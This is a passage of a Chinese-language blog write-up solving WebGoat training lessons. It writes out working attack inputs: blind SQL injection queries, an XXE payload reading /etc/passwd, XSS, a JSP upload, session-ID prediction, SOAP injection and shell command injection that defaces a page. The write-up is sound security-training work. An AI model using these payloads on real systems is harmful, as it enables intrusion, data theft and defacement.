+#</span><br><br>法一：二分法：<br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;5000</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2500</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;1250</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;1875</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;1875</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2187.5</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2343.75</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2421.375</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2382.5625</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2363.15625</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2372.859375</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2368.0078125</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2365.58203125</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin&lt;2364.369140625</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and pin=2364</span><br><br>法二：<br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and substr(pin,1,1)=2-- +#</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and substr(pin,1,2)=23-- +#</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and substr(pin,1,3)=236-- +#</span><br><br><span class="hljs-number">10</span><span class="hljs-comment">;select pin from pins where cc_number =1111222233334444 and substr(pin,1,4)=2364-- +#</span><br></code></pre></td></tr></table></figure>
+<p><code>223364</code></p>
+<h3 id="blind-string-sql-injection">Blind String SQL Injection</h3>
+<p>下面的表格允许用户输入一个帐号并确定它是否有效。 使用此表单开发真/假测试检查数据库中的其他条目。</p>
+<p>参考 Ascii 值：'A'= 65'Z'= 90'a'= 97'z'= 122</p>
+<p>目标是在 cc_number 为 4321432143214321 的行的表引脚中找到字段名称的值。该字段的类型是 varchar，它是一个字符串。</p>
+<p>将发现的名称放在表单中以传递课程。 只有发现的名字应该放在表单域中，密切关注拼写和大小写。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">10</span>;<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> pins <span class="hljs-keyword">where</span> cc_number=<span class="hljs-number">4321432143214321</span> <span class="hljs-keyword">and</span> length(<span class="hljs-type">name</span>)=<span class="hljs-number">4</span><span class="hljs-comment">-- +#</span><br><br><span class="hljs-number">10</span>;<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> pins <span class="hljs-keyword">where</span> cc_number=<span class="hljs-number">4321432143214321</span> <span class="hljs-keyword">and</span> substr(<span class="hljs-type">name</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;J&#x27;</span><span class="hljs-comment">-- +#</span><br><br><span class="hljs-number">10</span>;<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> pins <span class="hljs-keyword">where</span> cc_number=<span class="hljs-number">4321432143214321</span> <span class="hljs-keyword">and</span> substr(<span class="hljs-type">name</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)=<span class="hljs-string">&#x27;Ji&#x27;</span><span class="hljs-comment">-- +#</span><br><br><span class="hljs-number">10</span>;<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> pins <span class="hljs-keyword">where</span> cc_number=<span class="hljs-number">4321432143214321</span> <span class="hljs-keyword">and</span> substr(<span class="hljs-type">name</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)=<span class="hljs-string">&#x27;Ji&#x27;</span><span class="hljs-comment">-- +#</span><br><br><span class="hljs-number">10</span>;<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> pins <span class="hljs-keyword">where</span> cc_number=<span class="hljs-number">4321432143214321</span> <span class="hljs-keyword">and</span> substr(<span class="hljs-type">name</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)=<span class="hljs-string">&#x27;Jil&#x27;</span><span class="hljs-comment">-- +#</span><br><br><span class="hljs-number">10</span>;<span class="hljs-keyword">select</span> <span class="hljs-type">name</span> <span class="hljs-keyword">from</span> pins <span class="hljs-keyword">where</span> cc_number=<span class="hljs-number">4321432143214321</span> <span class="hljs-keyword">and</span> substr(<span class="hljs-type">name</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>)=<span class="hljs-string">&#x27;Jill&#x27;</span><span class="hljs-comment">-- +#</span><br></code></pre></td></tr></table></figure>
+<p><code>Jill</code></p>
+<h2 id="denial-of-service">Denial of Service</h2>
+<h3 id="zipbomb">ZipBomb</h3>
+<p>服务器只接受 ZIP 文件，在上传后提取它们，对它们进行处理并删除它，它提供 20 MB 的临时存储来处理所有请求尝试执行 DOS 攻击，消耗所有临时存储与一个请求</p>
+<p><strong>Zip 炸弹是什么东西？</strong></p>
+<p>Zip 炸弹也被称作是死亡压缩包或解压缩炸弹，这是一种恶意文档（archive）文件，当某个程序或系统尝试读取这个文件时，它便会让目标发生崩溃。一般来说，攻击者会利用这种 Zip 炸弹来让反病毒软件崩溃，然后为传统病毒的感染扫清障碍。</p>
+<p>主要是压缩比要高一点，可以新建一个 txt，全写 0，然后多复制几个 txt，压缩起来。40m 的 txt 压缩后大约是 70kb。上传即可。本来打算用 zip 炸弹的，但是后台处理的时候可能看解压出错就扔了，所以上传后什么返回都没有</p>
+<h3 id="denial-of-service-from-multiple-logins">Denial of Service from Multiple Logins</h3>
+<p>拒绝服务攻击是 Web 应用程序中的一个主要问题。 如果最终用户无法开展业务或执行 Web 应用程序提供的服务，那么浪费时间和金钱。</p>
+<p>总目标：</p>
+<p>该网站允许用户多次登录。 该站点有一个允许 2 个连接的数据库连接池。 您必须获取有效用户的列表，并创建总共 3 次登录。</p>
+<p>首先对 User Name 进行注入：</p>
+<p><code>1' or 1=1-- +#</code></p>
+<p>然后会出现所有的用户，选前 3 个登陆即可(后面 2 个它提示不能使用)</p>
+<p><code>1' or user_name=jsnow-- +#</code></p>
+<h2 id="insecure-communication">Insecure Communication</h2>
+<h3 id="insecure-login">Insecure Login</h3>
+<h4 id="stage-1-7">Stage 1</h4>
+<p>阶段 1：在这个阶段你必须嗅探密码。 登录后回答问题。</p>
+<p>抓包，<code>clear_pass=sniffy</code></p>
+<h4 id="stage-2-7">Stage 2</h4>
+<p>Stage2：现在您必须切换到安全连接。 该 URL 应以 https：//开头。如果您的浏览器对该证书抱怨只是忽略它。 再次嗅探交通并回答问题</p>
+<p>切换到 HTTPS 之后打不开网页，可能是 WebGoat 没有提供 HTTPS 的服务吧</p>
+<p>总之选 No，TLS</p>
+<h2 id="insecure-storage">Insecure Storage</h2>
+<h3 id="encoding-basics">Encoding Basics</h3>
+<p>本课将使用户熟悉不同的编码方案。</p>
+<p>输入字符串“abc”。 在下面的列表中，您可以看到字符串的编码值。 对于 rot13 编码，这是“nop”。 现在输入一个字符串“a c”并查看 url 编码。</p>
+<p>照做即可</p>
+<h2 id="malicious-execution">Malicious Execution</h2>
+<p>恶意执行</p>
+<h3 id="malicious-file-execution">Malicious File Execution</h3>
+<p>下面的表格允许您上传将显示在此页面上的图像。 像这样的功能通常在基于 Web 的讨论板和社交网站上找到。 此功能易受恶意文件 nt 执行的影响。</p>
+<p>为了通过本课，上传并运行恶意文件。 为了证明你的文件可以执行，它应该创建另一个名为：</p>
+<p>/home/macr0phag3/Downloads/.extract/webapps/WebGoat/mfe_target/guest.txt</p>
+<p>一旦你创建了这个文件，你将通过这个课程。</p>
+<p>先传一个正常图片，看看路径。然后再传一个 jsp（shell.jsp）</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gradle">&lt;HTML&gt;<br><br>&lt;% java.io.<span class="hljs-keyword">File</span> <span class="hljs-keyword">file</span>= <span class="hljs-keyword">new</span> java.io.<span class="hljs-keyword">File</span>(<span class="hljs-string">&quot;/home/macr0phag3/Downloads/.extract/webapps/WebGoat/mfe_target/guest.txt&quot;</span>);<span class="hljs-keyword">file</span>.createNewFile();%&gt;<br><br>&lt;/HTML&gt;<br></code></pre></td></tr></table></figure>
+<p>访问 shell.jsp 就通过了</p>
+<h2 id="parameter-tampering">Parameter Tampering</h2>
+<h3 id="bypass-html-field-restrictions">Bypass HTML Field Restrictions</h3>
+<p>绕过 HTML 字段限制</p>
+<p>下面的表单使用 HTML 表单字段限制。 为了通过本课，请提交包含不允许值的每个字段的表单。 您必须在一个表单提交中为所有六个字段提交无效值。</p>
+<p>先用 F12 把 disables 改了，然后在抓包，把每个参数都随便改改，提交即可</p>
+<h3 id="xml-external-entity-xxe">XML External Entity (XXE)</h3>
+<p><em>您正在寻找来自马萨诸塞州波士顿的机票代码 BOS，以获得理想的假期。 尝试搜索一张票。<br />
+</em>尝试在搜索表单中找到缺陷并列出操作系统的根目录。</p>
+<p>抓包，将 xml 改为</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br>	 <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta">	 <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">myentity</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd-&quot;</span> &gt;</span>]&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">searchForm</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span><span class="hljs-symbol">&amp;myentity;</span><span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br>	<span class="hljs-tag">&lt;/<span class="hljs-name">searchForm</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h3 id="exploit-hidden-fields">Exploit Hidden Fields</h3>
+<p>尝试购买低于购买价格的 HDTV，如果您还没有购买。</p>
+<p>抓包改 Price 即可</p>
+<h3 id="exploit-unchecked-email">Exploit Unchecked Email</h3>
+<p>此表单是客户支持页面的示例。 使用下面的表单尝试：<br />
+1）发送恶意脚本到网站管理员。<br />
+2）从 OWASP 向恶意脚本发送一个恶意脚本。</p>
+<p>先插入 <code>&lt;script&gt;alert('xss')&lt;/script&gt;</code> 发送，然后在抓包随便改改 email</p>
+<h3 id="bypass-client-side-javascript-validation">Bypass Client Side JavaScript Validation</h3>
+<p>本网站执行客户端和服务器端验证。 对于这个练习，你的工作是打破客户端验证并发送它不期望的网站输入。 你必须同时打破所有 7 个验证器。</p>
+<p>抓包，把每个参数都改为不符合正则的就行，比如每个参数都加一个 <code>!</code></p>
+<h2 id="session-management-flaws">Session Management Flaws</h2>
+<h3 id="spoof-an-authentication-cookie">Spoof an Authentication Cookie</h3>
+<p>用户应该能够绕过认证检查。 使用 webgoat / webgoat 帐户登录以查看会发生什么情况。 你也可以尝试 aspect/aspect。 当您了解身份验证 cookie 时，请尝试将您的身份更改为 alice。</p>
+<p><code>65432ubphcfx webgoat</code></p>
+<p><code>65432ubphcfx webgoat</code></p>
+<p><code>65432udfqtb aspect</code></p>
+<p><code>65432udfqtb aspect</code></p>
+<p>数字部分貌似没变，字母部分看上去像凯撒，爆破了一下：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">vcqidgy<br>wdrjehz<br>xeskfia<br>yftlgjb<br>zgumhkc<br>ahvnild<br><span class="hljs-keyword">biwojme</span><br><span class="hljs-keyword"></span>cjxpknf<br>dkyqlog<br>elzrmph<br>fmasnqi<br>gnbtorj<br>hocupsk<br>ipdvqtl<br><span class="hljs-keyword">jqewrum</span><br><span class="hljs-keyword"></span>krfxsvn<br>lsgytwo<br>mthzuxp<br>nuiavyq<br>ovjbwzr<br>pwkcxas<br>qxldybt<br>rymezcu<br>sznfadv<br>taogbew<br></code></pre></td></tr></table></figure>
+<p>找来找去没看到 web，后来发现最后一行。。。</p>
+<p>那么如法炮制 <code>alice</code> 即可，为 <code>fdjmb</code></p>
+<h3 id="hijack-a-session">Hijack a Session</h3>
+<p>开发自己会话 ID 的应用程序开发人员经常忘记包含安全性所需的复杂性和随机性。 如果用户特定的会话 ID 不是复杂且随机的，那么应用程序很容易受到基于会话的暴力攻击。</p>
+<p>尝试访问属于他人的已认证会话。</p>
+<p>测试了一下，看上去每次访问 Cookie 的 <code>-</code> 之前的哦数字都是+1 递增的。如果客户端发送给 Web 服务器的请求里面没有会话标识的话，服务器会从新生成一个新的会话标识并通过 Cookie 返回给客户端。既然存在他人的认证会话，那么必定有一个 Cookie 是被占用的，也就是分配给我们的 Cookie 存在跳跃。</p>
+<p>利用 bs 的 Intruder 测试一下，把 payload 放在 password 即可，payload 改为数字型，先发 50 个看看。结果发现在 25，26 个请求中出现断层：</p>
+<p>25：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 2">HTTP/1.1 200 OK<br>Server: Apache-Coyote/1.1<br>Set-Cookie: WEAKID=12875-1523008242367<br>Content-Type: text/html;charset=ISO-8859-1<br>Content-Length: 1281<br>Date: Fri, 06 Apr 2018 09:50:42 GMT<br>Connection: close<br></code></pre></td></tr></table></figure>
+<p>26</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span>: Apache-Coyote/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Set</span>-Cookie: WEAKID=<span class="hljs-number">12877</span>-<span class="hljs-number">1523008242369</span><br><span class="hljs-attribute">Content</span>-Type: text/html;charset=ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">1307</span><br><span class="hljs-attribute">Date</span>: Fri, <span class="hljs-number">06</span> Apr <span class="hljs-number">2018</span> <span class="hljs-number">09</span>:<span class="hljs-number">50</span>:<span class="hljs-number">42</span> GMT<br><span class="hljs-attribute">Connection</span>: close<br></code></pre></td></tr></table></figure>
+<p>那么也就意味着，12876 给了某个合法用户</p>
+<p>而 <code>-</code> 后面很像毫秒级的时间戳，看看是不是：</p>
+<p>1523008242367：2018/4/6 17:50:42</p>
+<p>1523008242369：2018/4/6 17:50:42</p>
+<p>看来后面的应该是 1523008242368 了</p>
+<p>搞定</p>
+<h3 id="session-fixation">Session Fixation</h3>
+<h4 id="strage-1">Strage 1</h4>
+<p>第 1 阶段：你是黑客乔，你想从简偷走这个会话。 发送准备好的电子邮件给受害者，看起来像银行的官方电子邮件。 模板消息在下面准备好，您需要在电子邮件内的链接中添加会话 ID（SID）。 改变链接以包含 SID。</p>
+<p>在 href 后面加上 <code>&amp;SID=666666 即可</code></p>
+<h4 id="strage-2">Strage 2</h4>
+<p>第 2 阶段：现在你是受害者 Jane，他收到下面的电子邮件。 如果您用鼠标指向链接，您会看到包含 SID。 点击它看看会发生什么。</p>
+<h4 id="stage-3-4">Stage 3</h4>
+<p>登陆 Jane 的帐号</p>
+<h4 id="stage-4-3">Stage 4</h4>
+<p>点击链接，然后把 url 改为的 sid 改为之前在邮件里设置的 sid</p>
+<h2 id="web-services">Web Services</h2>
+<h3 id="create-a-soap-request">Create a SOAP Request</h3>
+<h4 id="stage-1-8">Stage 1</h4>
+<p>Web 服务通过使用 SOAP 请求进行通信。 这些请求被提交给 Web 服务以尝试执行 Web 服务定义语言（WSDL）中定义的功能。 让我们学习一些关于 WSDL 文件的知识。 查看 WebGoat 的 Web 服务描述语言（WSDL）文件。<br />
+总目标：</p>
+<p>尝试使用浏览器或 Web 服务工具连接到 WSDL。 Web 服务的 URL 为：http：// localhost / WebGoat / services / SoapRequest 通常可以通过在 Web 服务请求的末尾添加一个？ WSDL 来查看 WSDL。 您必须访问 2 个操作才能通过本课程。</p>
+<p>先看一个简易版的标签描述:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">definitions</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">types</span>&gt;</span><br>      定义 web service 使用的数据类型。为了最大程度的平台中立性，WSDL 使用 XML Schema<br>      语法来定义自己数据类型，而不是采用任何既有的编程语言的数据类型。<br>   <span class="hljs-tag">&lt;/<span class="hljs-name">types</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span><br>     定义一个操作的数据元素。术语 Message 让人有点摸不着头脑，<br>     其实就是在定义参数（参数的名字及类型，类型由前面的 types 节定义）。     <br>   <span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span>   <br>   <span class="hljs-tag">&lt;<span class="hljs-name">portType</span>&gt;</span><br>      WSDL 中最重要的元素。也是一个让人摸不着头脑的术语。其实就是定义接口的名称。<br>      接口中的函数使用<span class="hljs-tag">&lt;<span class="hljs-name">operation</span>&gt;</span>元素来声明，函数的名字为 operation 元素的 name 属性，<br>      输入参数使用 input message 声明，输出参数使用 output message 声明<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">operation</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">portType</span>&gt;</span>  <br>   <span class="hljs-tag">&lt;<span class="hljs-name">binding</span>&gt;</span><br>      该部分指定接口与底层实现协议的实现细节。 该节跟编程没有直接的对应关系。<br>   <span class="hljs-tag">&lt;/<span class="hljs-name">binding</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span><br>      该部分用于指定实现了该接口的一个实例<br>   <span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">definitions</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>一共 4 个 operation</p>
+<h4 id="stage-2-8">Stage 2</h4>
+<p>int</p>
+<h4 id="stage-3-5">Stage 3</h4>
+<p>抓包，修改一下参数：</p>
+<ol type="1">
+<li><p><code>POST http://localhost/WebGoat/services/SoapRequest HTTP/1.1</code></p></li>
+<li><p><code>Content-Type: text/xml</code></p></li>
+<li><p><code>SOAPAction:</code></p></li>
+<li><p>第一次发</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">SOAP-ENV:Envelope</span> <span class="hljs-attr">xmlns:SOAP-ENV</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xsd</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">SOAP-ENV:Body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">ns1:getFirstName</span> <span class="hljs-attr">SOAP-ENV:encodingStyle</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span> <span class="hljs-attr">xmlns:ns1</span>=<span class="hljs-string">&quot;http://lessons&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">xsi:type</span>=<span class="hljs-string">&quot;xsd:int&quot;</span>&gt;</span>101<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br><br> <span class="hljs-tag">&lt;/<span class="hljs-name">ns1:getFirstName</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">SOAP-ENV:Body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">SOAP-ENV:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>​</p></li>
+<li><p>第二次发：</p></li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml">SOAPAction: <br><br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">SOAP-ENV:Envelope</span> <span class="hljs-attr">xmlns:SOAP-ENV</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xsd</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span><br><span class="hljs-tag"></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">SOAP-ENV:Body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">ns1:getLastName</span> <span class="hljs-attr">SOAP-ENV:encodingStyle</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;</span> <span class="hljs-attr">xmlns:ns1</span>=<span class="hljs-string">&quot;http://lessons&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">xsi:type</span>=<span class="hljs-string">&quot;xsd:int&quot;</span>&gt;</span>101<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br><br> <span class="hljs-tag">&lt;/<span class="hljs-name">ns1:getLastName</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">SOAP-ENV:Body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">SOAP-ENV:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>Joe Snow~</p>
+<h3 id="wsdl-scanning">WSDL Scanning</h3>
+<p>Web 服务通过使用 SOAP 请求进行通信。 这些请求被提交给 Web 服务以尝试执行 Web 服务定义语言（WSDL）文件中定义的功能。</p>
+<p>总目标：</p>
+<p>该屏幕是 Web 服务的 API。 检查此 Web 服务的 WSDL 文件并尝试获取一些客户信用编号。</p>
+<p>要拿到 CreditCardID，看 API，函数为 getCreditCard，抓包改一下参数即可。修改的参数和上一题一样，注意，POST 的 url。发包过去就好了</p>
+<h3 id="web-service-sql-injection">Web Service SQL Injection</h3>
+<p>总目标：</p>
+<p>检查 Web 服务描述语言（WSDL）文件并尝试获取多个客户信用卡号码。 您不会看到返回到此屏幕的结果。 当你相信你已经成功时，刷新页面并寻找'绿色星星'</p>
+<p>和上一题一样，payload 为：</p>
+<p><code>1 OR 1=1</code></p>
+<p>这 2 题推荐一下 bursuite 下的插件 wsdler，超级好用（手动构造 xml 简直不要太爽</p>
+<h3 id="web-service-sax-injection">Web Service SAX Injection</h3>
+<p>注入这个即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">666&lt;/password&gt;      &lt;<span class="hljs-built_in">id</span> xsi:<span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;xsd:int&#x27;</span>&gt;102&lt;/id&gt;       &lt;password xsi:<span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;xsd:string&#x27;</span>&gt;777<br></code></pre></td></tr></table></figure>
+<h2 id="admin-functions">Admin Functions</h2>
+<p>课程完成的纵览</p>
+<h2 id="the-challenge">The CHALLENGE</h2>
+<p>您的任务是打破身份验证方案，从数据库中窃取所有信用卡，然后污损网站。 你将不得不使用你在其他课程中学到的许多技巧。 这个网站的主要网页是'webgoat_challenge_guest.jsp'</p>
+<h4 id="stage-1-9">Stage 1</h4>
+<p>随便填了用户名密码，抓包，对所有的参数尝试进行注入，代码缺陷攻击，均无效。然后对那个隐藏的 usr 起了疑心，搜了一下，发现是智者为王，一个源自英国的电视游戏节目。作者肯定不会无缘无故选这个，按照 CTF 的尿性，和这个节目有关的东西十有八九是线索，然后找到了主持人常说的一句话：You are the weakest link, goodbye</p>
+<p>随便填了用户名密码，抓包，对所有的参数尝试进行注入，代码缺陷攻击，均无效。然后对那个隐藏的 usr 起了疑心，搜了一下，发现是 <code>智者为王</code>，一个源自英国的电视游戏节目。作者肯定不会无缘无故选这个，按照 CTF 的尿性，和这个节目有关的东西十有八九是线索，然后找到了主持人常说的一句话：<code>You are the weakest link, goodbye</code></p>
+<p>加上 usr 的 <code>youaretheweakestlink</code>，猜测这是一对用户名/密码，登陆，成功了。。。</p>
+<h4 id="stage-2-9">Stage 2</h4>
+<p>在 Cookie 中的 usr 存在 SQL 注入，注意 base64 编码</p>
+<h4 id="stage-3-6">Stage 3</h4>
+<p>抓包，改 File 即可：</p>
+<p>不知道路径，慢慢来</p>
+<ol type="1">
+<li><p><code>ip;pwd</code> =&gt; <code>/home/macr0phag3/Downloads</code></p></li>
+<li><p>```<br />
+ip;find -name "webgoat_challenge_guest.jsp"=&gt;./.extract/webapps/WebGoat/webgoat_challenge_guest.jsp<br />
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>3. ```1<br>   ip;<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Hack by Tr0y&#x27;</span> &gt; /home/XXXXXX/Downloads/.extract/webapps/WebGoat/webgoat_challenge_guest.jsp<br></code></pre></td></tr></table></figure></p></li>
+</ol>
+<h2 id="完结">完结</h2>
